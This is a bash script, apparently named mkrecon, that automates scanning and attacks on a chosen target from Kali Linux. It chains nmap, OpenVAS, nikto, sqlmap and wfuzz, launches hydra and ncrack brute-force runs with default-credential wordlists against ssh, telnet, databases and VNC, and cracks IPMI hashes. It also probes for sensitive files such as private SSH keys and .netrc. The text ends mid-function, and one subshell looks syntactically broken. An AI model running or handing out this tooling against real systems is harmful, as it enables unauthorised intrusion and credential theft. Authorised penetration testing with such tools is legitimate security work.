#!/bin/bash
# 20180515 Kirby

umask 077

################################################################################
function MAIN()
{ 
    #set -x

    local job
    local jobscount
    local port
    local rawport
    local proto
    local ssl
    
    export TARGET=$1 
    export RECONDIR="${HOME}/mkrecon/${TARGET}"
    mkdir -p ${HOME}/mkrecon >/dev/null 2>&1
    cd ${HOME}/mkrecon || exit 1
    if [[ -d "$TARGET" ]]
    then
        # remove old files
        rm -rf "$TARGET" >/dev/null 2>&1
    fi
    
    buildEnv || exit 1
    cd "$RECONDIR" || exit 1
    
    echo "starting openvasScan"
    echo "... outputs $RECONDIR/${TARGET}.openvas.csv"
    echo "... outputs $RECONDIR/${TARGET}.openvas.html"
    echo "... outputs $RECONDIR/${TARGET}.openvas.txt"
    openvasScan &

    echo "starting snmpScan"
    echo "... outputs $RECONDIR/${TARGET}.snmp-check and deletes if none found"
    snmpScan &
    
    echo "starting nmapScan"
    echo "... outputs $RECONDIR/${TARGET}.nmap"
    echo "... outputs $RECONDIR/${TARGET}.ngrep"
    echo "... outputs $RECONDIR/${TARGET}.xml"
    nmapScan
    if ! grep -q 'Ports: ' "$RECONDIR"/${TARGET}.ngrep 2>/dev/null
    then
        echo "FAILED: no ports found"
        exit 1
    fi
    echo "starting crackers"
    echo "... outputs $RECONDIR/${TARGET}.ncrack"
    echo "... outputs $RECONDIR/${TARGET}.brutespray"
    crackers &
    
    echo "starting searchsploit"
    echo "... outputs $RECONDIR/${TARGET}.searchsploit"
    searchsploit --colour --nmap "$RECONDIR"/${TARGET}.xml >> "$RECONDIR"/${TARGET}.searchsploit 2>&1 &
    
    echo "starting basicEyeWitness"
    echo "... outputs $RECONDIR/${TARGET}.basicEyeWitness"
    basicEyeWitness &
    
    echo "starting otherNmaps"
    echo "... outputs $RECONDIR/${TARGET}.nmap-auth"
    echo "... outputs $RECONDIR/${TARGET}.nmap-exploitvuln"
    echo "... outputs $RECONDIR/${TARGET}.nmap-discoverysafe"
    echo "... outputs $RECONDIR/${TARGET}.nmap-ajp-brute"
    echo "... outputs $RECONDIR/${TARGET}.nmap-xmpp-brute"
    echo "... outputs $RECONDIR/${TARGET}.nmap-oracle-sid-brute"
    echo "... outputs $RECONDIR/${TARGET}.nmap-ipmi-brute"
    otherNmaps &
    
    echo "examining open ports"
    echo "... outputs $RECONDIR/${TARGET}.baseurls"
    echo "... outputs $RECONDIR/${TARGET}.port.certificate"
    for rawport in $(egrep 'Ports: ' "$RECONDIR"/${TARGET}.ngrep)
    do  
        if ! echo $rawport |egrep -q '[[:digit:]]+/open/'
        then
            continue
        fi  

        port=${rawport%%/*}
        echo "examining port $port"
    
        # web
        if echo $rawport |grep -v Splunkd |egrep -q '[[:digit:]]+/open/tcp//http'
        then
            echo "http://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
        fi
        if echo $rawport |grep -v Splunkd |egrep -q '[[:digit:]]+/open/tcp//ssl.http'
        then
            echo "https://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
        fi

        # sometimes nmap can't identify a web service, so just try anyways
        if echo $rawport |grep -v Splunkd |egrep -q '[[:digit:]]+/open/tcp/' 2>/dev/null \
        && echo "... testing $port for http with wget" \
        && $TIMEOUT 30 wget --tries=2 -O /dev/null --no-check-certificate -S  -D $TARGET \
            --method=HEAD http://${TARGET}:${port} 2>&1 |egrep -qi 'HTTP/|X-|Content|Date' \
        && ! grep -q "http://${TARGET}:${port}" "$RECONDIR"/${TARGET}.baseurls >/dev/null 2>&1
        then
            echo "http://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
        fi
        if echo $rawport |grep -v Splunkd |egrep -q '[[:digit:]]+/open/tcp/' 2>/dev/null \
        && echo "... testing $port for https with wget" \
        && $TIMEOUT 30 wget --tries=2 -O /dev/null --no-check-certificate -S  -D $TARGET \
            --method=HEAD https://${TARGET}:${port} 2>&1 |egrep -qi 'HTTP/|X-|Content|Date' \
        && ! grep -q "https://${TARGET}:${port}" "$RECONDIR"/${TARGET}.baseurls >/dev/null 2>&1
        then
            echo "https://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
        fi

        # check for SSL/TLS
        if echo $rawport |grep -v Splunkd |egrep -q '[[:digit:]]+/open/tcp/' 2>/dev/null \
        && echo "... testing $port for ssl/tls with openssl" \
        && echo quit|$TIMEOUT 30 openssl s_client -showcerts -connect ${TARGET}:${port} 2>/dev/null |grep CERTIFICATE >/dev/null 2>&1
        then
            echo quit|$TIMEOUT 30 openssl s_client -showcerts -connect ${TARGET}:${port} > "$RECONDIR"/${TARGET}.${port}.certificate 2>&1
            ssl=1
            proto="https"
        else
            ssl=0
            proto="http"
        fi

        # telnet
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//telnet'
        then
            echo "starting doHydra $port telnet"
            echo "... outputs $RECONDIR/${TARGET}.telnet.$port.hydra"
            doHydra $port telnet /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt &
            doHydra $port telnet /usr/share/routersploit/routersploit/wordlists/defaults.txt &
        fi
    
        # ssh
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//ssh'
        then
            echo "starting doHydra $port ssh"
            echo "... outputs $RECONDIR/${TARGET}.ssh.$port.hydra"
            doHydra $port ssh /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt &
            doHydra $port ssh /usr/share/routersploit/routersploit/wordlists/defaults.txt &
        fi
    
        # mssql
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//ms-sql'
        then
            echo "starting doHydra $port mssql"
            echo "... outputs $RECONDIR/${TARGET}.mssql.$port.hydra"
            doHydra $port mssql /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt &
        fi
    
        # mysql
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//mysql'
        then
            echo "starting doHydra $port mysql"
            echo "... outputs $RECONDIR/${TARGET}.mysql.$port.hydra"
            doHydra $port mysql /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt &
        fi
    
        # oracle
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//oracle-tns'
        then
            echo "starting doHydra $port oracle"
            echo "... outputs $RECONDIR/${TARGET}.oracle.$port.hydra"
            doHydra $port oracle-listener /usr/share/seclists/Passwords/Default-Credentials/oracle-betterdefaultpasslist.txt &
            doHydra $port oracle-listener "$RECONDIR"/tmp/oracle-default-accounts.lst &
        fi

        # vnc
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//vnc'
        then
            echo "starting passHydra $port vnc"
            echo "... outputs $RECONDIR/${TARGET}.vnc.$port.hydra"
            passHydra $port vnc /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt &
        fi

        # rsh
        if echo $rawport |egrep -q '^514/open'
        then
            echo "starting rshBrute"
            echo "... outputs $RECONDIR/${TARGET}.rsh"
            rshBrute &
        fi
    
        # nfs
        if echo $rawport |egrep -q '/open/tcp//mountd' \
        || echo $rawport |egrep -q '/open/tcp//nfs'
        then
            echo "starting nfsScan"
            echo "... outputs $RECONDIR/${TARGET}.showmount-e if anything found"
            echo "... outputs $RECONDIR/${TARGET}.showmount-a if anything found"
            echo "... outputs $RECONDIR/${TARGET}.nfsls if anything found"
            nfsScan &
        fi

        # ipmi
        if echo $rawport |egrep -q '^623/open/tcp'
        then
            echo "starting ipmiScan"
            echo "... outputs $RECONDIR/${TARGET}.ipmi.hashcat"
            echo "... outputs $RECONDIR/${TARGET}.ipmi.john"
            echo "... outputs $RECONDIR/${TARGET}.ipmi.john.cracked"
            ipmiScan &
        fi
    
        # memcache
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//memcached'
        then
            echo "starting memcacheScan"
            echo "... outputs $RECONDIR/${TARGET}.msf.memcached.${port}.out"
            memcacheScan $port &
        fi
    
        # dns
        if echo $rawport |egrep -q '53/open/udp//domain'
        then
            echo "starting dnsScan"
            echo "... outputs $RECONDIR/${TARGET}.dnsreconptr.local"
            echo "... outputs $RECONDIR/${TARGET}.dnsreconptr.rfc1918"
            echo "... outputs $RECONDIR/${TARGET}.dnsenum"
            echo "... outputs $RECONDIR/${TARGET}.dnsrecon"
            echo "... outputs $RECONDIR/${TARGET}.host-a"
            echo "... outputs $RECONDIR/${TARGET}.host-l"
            echo "... outputs $RECONDIR/${TARGET}.arpas/"
            echo "... outputs $RECONDIR/${TARGET}.domains"
            dnsScan &
        fi
    
        # ike
        if echo $rawport |egrep -q '[[:digit:]]+/open/udp//isakmp'
        then
            echo "starting ikeScan for port $port"
            echo "... outputs $RECONDIR/${TARGET}.${port}.ike-scan"
            ikeScan $port &
        fi
    
        # rsync
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//rsync'
        then
            echo "starting rsyncScan for port $port"
            echo "... outputs $RECONDIR/${TARGET}.${port}.rsync"
            echo "... outputs $RECONDIR/${TARGET}.${port}.rsync-\$share"
            rsyncScan $port &
        fi
    
        # cifs/smb
        if echo $rawport |egrep -q '445/open/tcp//microsoft-ds' \
        || echo $rawport |egrep -q '445/open/tcp//netbios-ssn'
        then
            echo "starting smbScan"
            echo "... outputs $RECONDIR/${TARGET}.smbshares"
            echo "... outputs $RECONDIR/${TARGET}.smbdirs"
            echo "... outputs $RECONDIR/${TARGET}.rpcclient"
            smbScan &
        fi
    
        # redis
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//redis/'
        then
            echo "starting redisScan for port $port"
            echo "... outputs $RECONDIR/${TARGET}.redis.${port}"
            redisScan $port &
        fi
    
        # ldap
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//ldap/'
        then
            echo "starting ldapScan for port $port"
            echo "... outputs $RECONDIR/${TARGET}.ldap.${port}"
            echo "... outputs $RECONDIR/${TARGET}.ldap.${port}.\$context"
            ldapScan $port &
        fi

        # elasticsearch
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//http//Elasticsearch'
        then
            echo "starting elasticsearchScan for port $port"
            echo "... outputs $RECONDIR/${TARGET}.elasticsearch.indexes.${port}"
            echo "... outputs $RECONDIR/${TARGET}.elasticsearch.indexes.${port}.\$index"
            elasticsearchScan $port $proto &
        fi
    
        # iscsi
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//iscsi'
        then
            echo "starting iscsiScan for port $port"
            echo "... outputs $RECONDIR/${TARGET}.iscsiadm.${port}"
            iscsiScan $port
        fi
    
        # docker
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//.*//Docker'
        then
            echo "starting dockerScan for port $port"
            echo "... outputs $RECONDIR/${TARGET}.dockerinfo.${port}"
            echo "... outputs $RECONDIR/${TARGET}.dockernetworks.${port}"
            echo "... outputs $RECONDIR/${TARGET}.dockercontainers.${port}"
            echo "... outputs $RECONDIR/dockertop.${port}.${id}"
            echo "... outputs $RECONDIR/dockerchanges.${port}.${id}"
            echo "... outputs $RECONDIR/dockershadow.${port}.${id}"
            echo "... outputs $RECONDIR/${TARGET}.dockerepo.${port}"
            dockerScan $port $proto 
        fi
        # postgres
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//postgresql'
        then
            echo "starting postgresqlScan for port $port"
            echo "... outputs $RECONDIR/${TARGET}.postgresql.$port"
            postgresqlScan $port &

            echo "starting postgresqlHydra for port $port"
            echo "... outputs $RECONDIR/${TARGET}.postgresql.$port.hydra"
            doHydra $port postgres /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt &
        fi

        # mysql
        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//mysql'
        then
            echo "starting mysqlScan for port $port"
            echo "... outputs $RECONDIR/${TARGET}.mysql.$port"
            mysqlScan $port &
        fi
    
    done
    
    if [[ -f "$RECONDIR"/${TARGET}.baseurls ]]
    then
        echo "starting skipfishScan"
        echo "... outputs $RECONDIR/${TARGET}.skipfish/"
        skipfishScan &

        echo "starting niktoScan"
        echo "... outputs $RECONDIR/${TARGET}:\$port.nikto"
        niktoScan &

        echo "starting webWords"
        echo "... outputs $RECONDIR/${TARGET}.webwords"
        webWords 

        echo "starting webDiscover"
        echo "... outputs $RECONDIR/${TARGET}.robots.txt"
        echo "... outputs $RECONDIR/${TARGET}.robotspider.html"
        echo "... outputs $RECONDIR/${TARGET}.dirburls"
        echo "... outputs $RECONDIR/${TARGET}.dirburls.401"
        echo "... outputs $RECONDIR/${TARGET}.spider"
        echo "... outputs $RECONDIR/${TARGET}.spider.html"
        echo "... outputs $RECONDIR/${TARGET}.urls"
        echo "... outputs $RECONDIR/${TARGET}.urls.html"
        webDiscover 
    fi
    
    if [[ -f "$RECONDIR"/${TARGET}.spider ]]
    then
        echo "starting sqlmapScan"
        echo "... outputs $RECONDIR/${TARGET}.sqlmap"
        sqlmapScan &

        echo "starting cewlCrawl"
        echo "... outputs $RECONDIR/${TARGET}.cewl"
        echo "... outputs $RECONDIR/${TARGET}.cewlemail"
        echo "... outputs $RECONDIR/${TARGET}.cewlmeta"
        cewlCrawl &
    fi
    
    if [[ -f "$RECONDIR"/${TARGET}.dirburls.401 ]]
    then
        echo "starting hydraScanURLs"
        echo "... outputs $RECONDIR/${TARGET}.hydra if anything found"
        hydraScanURLs &
    fi
    
    if [[ -f "$RECONDIR"/${TARGET}.urls ]]
    then
        echo "starting getHeaders"
        echo "... outputs $RECONDIR/${TARGET}.headers"
        getHeaders &

        echo "starting scanURLs"
        echo "... outputs $RECONDIR/${TARGET}.whatweb"
        echo "... outputs $RECONDIR/${TARGET}.wpscan if anything found"
        echo "... outputs $RECONDIR/${TARGET}.joomscan if anything found"
        echo "... outputs $RECONDIR/${TARGET}.fimap if anything found"
        scanURLs &

        echo "starting davScanURLs"
        echo "... outputs $RECONDIR/${TARGET}.davtest if anything found"
        echo "... outputs $RECONDIR/${TARGET}.cadaver if anything found"
        echo "... outputs $RECONDIR/${TARGET}.nmap-webdav if anything found"
        davScanURLs &

        echo "starting mechDumpURLs"
        echo "... outputs $RECONDIR/${TARGET}.mech-dump"
        mechDumpURLs 

        echo "starting fuzzURLs"
        echo "... outputs $RECONDIR/${TARGET}.wfuzz"
        fuzzURLs &
    fi

    if [[ -f "$RECONDIR"/tmp/${TARGET}.spider.raw ]]
    then
        echo "starting exifScanURLs"
        echo "... outputs $RECONDIR/${TARGET}.exif.html if anything found"
        exifScanURLs &
    fi
    
    jobscount=0
    while jobs |grep -q Running
    do
        echo "Jobs are still running.  Waiting $jobscount out of 240"
        jobs -l
        (( jobscount++ ))
        if [[ "$jobscount" -ge 240 ]]
        then
            echo "killing jobs"
            killHangs
            for job in $(jobs -l |awk '{print $2}')
            do
                kill $job
            done
        else
            sleep 60
        fi
    done

    echo "starting defaultCreds"
    echo "... outputs $RECONDIR/${TARGET}.defaultCreds"
    defaultCreds
    
    if screen -ls |grep -q ".${TARGET}."
    then
        echo "List of detached screens:"
        screen -ls |grep ".${TARGET}."
    fi
    
    
    set +x
}
################################################################################

################################################################################
function joinBy()
{ 
    local IFS="$1"
    shift
    echo "$*"
}
################################################################################

################################################################################
function killHangs()
{
    # sometimes scans will fork and hang
    local scan
    for scan in ike-scan joomscan sqlmap whatweb wpscan nikto fimap dirb ldapsearch redis-cli rpcclient smbclient dnsrecon dnsenum netkit-rsh showmount wget cewl
    do
        pkill -t $TTY -f $scan
    done

    return 0
}
################################################################################

################################################################################
function buildEnv()
{
    local file
    local pkg
    local pkgs="alien bind9-host blindelephant brutespray cewl curl dirb dnsenum dnsrecon dos2unix exif exploitdb eyewitness hydra ike-scan john joomscan jq ldap-utils libxml2-utils libwww-mechanize-perl mariadb-common metasploit-framework ncrack nikto nmap nmap-common nsis open-iscsi openvas-cli postgresql-client-common routersploit rpm rsh-client screen seclists skipfish snmpcheck wfuzz wget whatweb wpscan xmlstarlet"

    for pkg in $pkgs
    do
        if ! dpkg -s $pkg >/dev/null 2>&1
        then
            echo "FAILED: missing apps."
            echo "run: apt-get update; apt-get upgrade -y; apt-get install -y $pkgs"
            return 1
        fi
    done

    TIMEOUT='timeout --kill-after=10 --foreground'
    local rawtty=$(tty)
    TTY=${rawtty#*/*/}
    BORDER='################################################################################' 
    DATE=$(date +"%Y%m%d%H%M")

    if [[ "$LOGNAME" != "root" ]]
    then
        echo "FAILED: you must run as root"
        return 1
    fi

    if [[ "$RECONDIR" =~ ^$ ]]
    then
        echo "FAILED: you must define RECONDIR"
        return 1
    fi

    if [[ "$TARGET" =~ ^$ ]]
    then
        echo "FAILED: you must define TARGET"
        return 1
    fi

    if [[ ! -d "$RECONDIR" ]]
    then
        if ! mkdir -p $RECONDIR
        then
            echo "FAILED: unable to create dir $RECONDIR"
            return 1
        fi
    fi

    if ! grep -q kali /etc/os-release
    then
        echo "FAILURE: you should be running this script on kali"
        return 1
    fi

    # prep default usernames/passwords
    mkdir -p "$RECONDIR"/tmp >/dev/null 2>&1
    if [[ ! -f "$RECONDIR"/tmp/users.lst ]] \
    || [[ ! -f "$RECONDIR"/tmp/passwds.lst ]]
    then
        rm -f "$RECONDIR"/tmp/users.tmp "$RECONDIR"/tmp/passwds.tmp >/dev/null 2>&1

        cat /usr/share/wordlists/metasploit/http_default_users.txt \
            /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt \
            /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
            >> "$RECONDIR"/tmp/users.tmp 

        cat /usr/share/seclists/Passwords/Common-Credentials/best110.txt \
            /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
            /usr/share/seclists/Passwords/Common-Credentials/top-shortlist.txt \
            /usr/share/wordlists/metasploit/idrac_default_pass.txt \
            >> "$RECONDIR"/tmp/passwds.tmp

        # add extra passwords
        echo "adminadmin" >> "$RECONDIR"/tmp/passwds.tmp
        echo "changethis" >> "$RECONDIR"/tmp/passwds.tmp
        echo "changeme" >> "$RECONDIR"/tmp/passwds.tmp
        echo "j5Brn9" >> "$RECONDIR"/tmp/passwds.tmp
        echo "UNKNOWN" >> "$RECONDIR"/tmp/passwds.tmp
        echo "Password" >> "$RECONDIR"/tmp/passwds.tmp

        cat "$RECONDIR"/tmp/users.tmp |dos2unix |sed -e 's/ //g' |sort -u > "$RECONDIR"/tmp/users.lst
        cat "$RECONDIR"/tmp/users.tmp "$RECONDIR"/tmp/passwds.tmp |dos2unix |sed -e 's/ //g' |sort -u > "$RECONDIR"/tmp/passwds.lst
    fi

    # convert nmap's default oracle list to hydra format
    cat /usr/share/nmap/nselib/data/oracle-default-accounts.lst |grep '/' |sed -e 's/\//:/g' \
        > "$RECONDIR"/tmp/oracle-default-accounts.lst 

    rm -f "$RECONDIR"/tmp/mkrecon.txt >/dev/null 2>&1
    echo '.cvspass' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.Xauthority' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.vnc/passwd' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.lesshst' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.viminfo' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.netrc' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.ssh/id_rsa' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.ssh/id_dsa' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.ssh/id_ecdsa' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.git' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.gitconfig' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.wget-hsts' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.smb/smb.conf' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.dropbox' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.rsyncpw' >> "$RECONDIR"/tmp/mkrecon.txt
    echo '.k5login' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'security.txt' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'dashboard' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'xvwa' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'Labs' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'unsafebank' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'webalizer' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'wls-wsat/RegistrationPortTypeRPC' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'wls-wsat/ParticipantPortType' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'wls-wsat/RegistrationRequesterPortType' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'wls-wsat/CoordinatorPortType11' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'wls-wsat/CoordinatorPortType' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'wls-wsat/RegistrationPortTypeRPC11' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'wls-wsat/ParticipantPortType11' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'wls-wsat/RegistrationRequesterPortType11' >> "$RECONDIR"/tmp/mkrecon.txt
    echo 'wls-wsat/CoordinatorPortType' >> "$RECONDIR"/tmp/mkrecon.txt

    if [[ ! -f "$RECONDIR"/tmp/dns.lst ]]
    then
        cat \
            /usr/share/dnsrecon/namelist.txt \
            /usr/share/dnsenum/dns.txt \
            /usr/share/nmap/nselib/data/vhosts-full.lst \
            |sort -u >"$RECONDIR"/tmp/dns.lst
    fi

    if echo $TARGET |egrep -q '[[:digit:]]+\.[[:digit:]]+\.[[:digit:]]+\.[[:digit:]]+'
    then
        IP=$TARGET
    else
        IP=$(getent hosts $TARGET|awk '{print $1}' |head -1)
    fi

    if ! echo $IP |egrep -q '[[:digit:]]+\.[[:digit:]]+\.[[:digit:]]+\.[[:digit:]]+'
    then
        echo "FAILED: unable to resolve host $TARGET"
        exit 1
    fi

    return 0
}
################################################################################

################################################################################
function openvasScan()
{
    local ovusername='admin'
    local ovpassword='notMyPassword'
    local targetUuid
    local configUuid
    local taskUuid
    local scanUuid
    local reportCSV
    local reportTXT
    local reportHTML
    local pkg

    if ! omp -u $ovusername -w $ovpassword -g >/dev/null 2>&1
    then
        echo "$BORDER"
        echo "WARNING: UNABLE TO CONNECT TO OPENVAS"
        echo "If you need to install OpenVas, run apt-get install -y greenbone-security-assistant greenbone-security-assistant-common openvas openvas-cli openvas-manager openvas-manager-common openvas-scanner"
        echo "Then run openvas-check-setup and follow the instructions until it says everything is working."
        echo "Also change the username/password in the openvasScan function of this script."
        echo "$BORDER"
        echo "Continuing without OpenVAS..."
        return 1
    fi

    if ! grep -q max_checks /etc/openvas/openvassd.conf
    then
        echo "max_checks=2" >>/etc/openvas/openvassd.conf
    fi

    reportCSV=$(omp -u $ovusername -w $ovpassword -F |awk '/  CSV Results$/ {print $1}' |head -1)
    reportTXT=$(omp -u $ovusername -w $ovpassword -F |awk '/  TXT$/ {print $1}' |head -1)
    reportHTML=$(omp -u $ovusername -w $ovpassword -F |awk '/  HTML$/ {print $1}' |head -1)

    # If you want customized settings, call the profile "mkrecon"
    if omp -u $ovusername -w $ovpassword -g 2>&1 |egrep -q ' mkrecon$'
    then
        configUuid=$(omp -u $ovusername -w $ovpassword -g|egrep ' mkrecon$'|awk '{print $1}')
    else
        configUuid=$(omp -u $ovusername -w $ovpassword -g|egrep ' Full and fast$'|awk '{print $1}')
    fi

    targetUuid=$(omp -u $ovusername -w $ovpassword --pretty-print --xml "<create_target>
          <name>${TARGET}-$RANDOM</name>
          <hosts>${TARGET}</hosts>
          </create_target>" |xmlstarlet sel -t -v /create_target_response/@id)

    if ! taskUuid=$(omp -u $ovusername -w $ovpassword -C --config=$configUuid --target=$targetUuid -n ${TARGET}-${DATE})
    then
        echo "FAILED: UNABLE TO CREATE OPENVAS TASK"
        return 1
    fi

    if ! scanUuid=$(omp -u $ovusername -w $ovpassword -S $taskUuid)
    then
        echo "FAILED: UNABLE TO START OPENVAS TASK"
        return 1
    fi

    while ! omp -u $ovusername -w $ovpassword -G $taskUuid 2>/dev/null|grep $taskUuid|egrep -q "Done|Stopped"
    do
        sleep 20
    done

    omp -u $ovusername -w $ovpassword --get-report $scanUuid --format $reportCSV \
        >"$RECONDIR"/${TARGET}.openvas.csv 2>&1
    omp -u $ovusername -w $ovpassword --get-report $scanUuid --format $reportTXT \
        >"$RECONDIR"/${TARGET}.openvas.txt 2>&1
    omp -u $ovusername -w $ovpassword --get-report $scanUuid --format $reportHTML \
        >"$RECONDIR"/${TARGET}.openvas.html 2>&1

    return 0
}
################################################################################

################################################################################
function snmpScan()
{
    # snmp
    # nmap has false negatives on snmp detection.  We'll try communities with snmp-check.
    local community

    for community in $(cat \
        /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
        /usr/share/nmap/nselib/data/snmpcommunities.lst \
        /usr/share/seclists/Discovery/SNMP/snmp.txt \
        /usr/share/routersploit/routersploit/wordlists/snmp.txt \
        |egrep -v '^#'|sort -u )
    do
        echo "snmp-check -c $community $IP 2>&1 \
            |egrep -v '^snmp-check |^Copyright |SNMP request timeout' \
            >>\"$RECONDIR\"/tmp/${TARGET}.snmp-check 2>&1" \
            >> "$RECONDIR"/tmp/${TARGET}.snmp-check.sh
    done
    echo "grep -q 'System information' \"$RECONDIR\"/tmp/${TARGET}.snmp-check \
        && mv -f \"$RECONDIR\"/tmp/${TARGET}.snmp-check \"$RECONDIR\"/${TARGET}.snmp-check" \
        >>"$RECONDIR"/tmp/${TARGET}.snmp-check.sh
    chmod 700 "$RECONDIR"/tmp/${TARGET}.snmp-check.sh
    screen -dmS ${TARGET}.snmp-check.$RANDOM $TIMEOUT 3600 "$RECONDIR"/tmp/${TARGET}.snmp-check.sh

    return 0
}
################################################################################


################################################################################
function nmapScan()
{
    # other udp ports: U:111,123,12444,1258,13,13200,1604,161,17185,17555,177,1900,20110,20510,2126,2302,23196,26000,27138,27244,27777,27950,28138,30710,3123,31337,3478,3671,37,3702,3784,389,44818,4569,47808,49160,49161,49162,500,5060,53,5351,5353,5683,623,636,64738,6481,67,69,8611,8612,8767,88,9100,9600 
    nmap -Pn --open -T3 -sT -sU -p T:1-65535,U:67,68,69,111,123,161,500,53,623,5353,1813,4500,177,5060,5269 \
        --script=version -sV --version-all -O \
        -oN "$RECONDIR"/${TARGET}.nmap \
        -oG "$RECONDIR"/${TARGET}.ngrep \
        -oX "$RECONDIR"/${TARGET}.xml \
        $TARGET >/dev/null 2>&1

    return 0
}
################################################################################

################################################################################
function basicEyeWitness()
{
    if [[ ! -f "$RECONDIR"/${TARGET}.xml ]]
    then
        echo "FAILED: no nmap xml file"
        return 1
    fi
    screen -dmS ${TARGET}.ew.$RANDOM $TIMEOUT 3600 \
        eyewitness --threads 1 -d "$RECONDIR"/${TARGET}.basicEyeWitness \
        --no-dns --no-prompt --all-protocols -x "$RECONDIR"/${TARGET}.xml

    return 0
}
################################################################################

################################################################################
function otherNmaps()
{
    local a_tcpports=()
    local a_udpports=()
    local a_urls=()
    local port
    local tcpports
    local udpports
    local scanports
    local sid

    if [[ ! -f "$RECONDIR"/${TARGET}.ngrep ]]
    then
        echo "FAILED TO FIND NGREP FILE"
        return 1
    fi
    for port in $(egrep 'Ports: ' "$RECONDIR"/${TARGET}.ngrep)
    do
        if echo $port |egrep -q '[[:digit:]]+/open/tcp/'
        then
            a_tcpports[${#a_tcpports[@]}]=${port%%/*}
            tcpports="T:$(joinBy , "${a_tcpports[@]}")"
        fi
        if echo $port |egrep -q '[[:digit:]]+/open/udp/'
        then
            a_udpports[${#a_udpports[@]}]=${port%%/*}
            udpports="U:$(joinBy , "${a_udpports[@]}")"
        fi
        scanports=$(joinBy , $tcpports $udpports)
    done

    ( $TIMEOUT 28800 nmap -T3 -Pn -p $scanports --script=ajp-brute -oN "$RECONDIR"/${TARGET}.nmap-ajp-brute $TARGET |grep -q '|' \
        || rm -f "$RECONDIR"/${TARGET}.nmap-ajp-brute ) &

    ( $TIMEOUT 28800 nmap -T3 -Pn -p $scanports --script=xmpp-brute -oN "$RECONDIR"/${TARGET}.nmap-xmpp-brute $TARGET |grep -q '|' \
        || rm -f "$RECONDIR"/${TARGET}.nmap-xmpp-brute ) &

    ( $TIMEOUT 28800 nmap -T3 -Pn -p $scanports --script=oracle-sid-brute -oN "$RECONDIR"/${TARGET}.nmap-oracle-sid-brute $TARGET |grep -q '|' \
        if grep -q '|' "$RECONDIR"/${TARGET}.nmap-oracle-sid-brute
        then
            for sid in $(awk '/^|/ {print $2}' "$RECONDIR"/${TARGET}.nmap-oracle-sid-brute |grep -v oracle-sid-brute)
            do
                $TIMEOUT 28800 nmap -T3 -Pn -p $scanports --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=$sid -oN "$RECONDIR"/${TARGET}.nmap-oracle-brute-stealth.${sid} $TARGET &
                $TIMEOUT 28800 nmap -T3 -Pn -p $scanports --script oracle-enum-users --script-args oracle-enum-users.sid=$sid,userdb=$RECONDIR/tmp/users.lst -oN "$RECONDIR"/${TARGET}.nmap-oracle-enum-users.${sid} $TARGET &
            done
        else
            rm -f "$RECONDIR"/${TARGET}.nmap-oracle-sid-brute 
        fi
    ) &

    ( $TIMEOUT 28800 nmap -T3 -Pn -sU --script ipmi-brute -p 623 -oN "$RECONDIR"/${TARGET}.nmap-ipmi-brute $TARGET |grep -q '|' \
        || rm -f "$RECONDIR"/${TARGET}.nmap-ipmi-brute ) &

    screen -dmS ${TARGET}.nmap-auth.$RANDOM $TIMEOUT 28800 \
        nmap -T3 -Pn -p $scanports --script=auth -oN "$RECONDIR"/${TARGET}.nmap-auth $TARGET

    screen -dmS ${TARGET}.nmap-exploitvuln.$RANDOM $TIMEOUT 28800 \
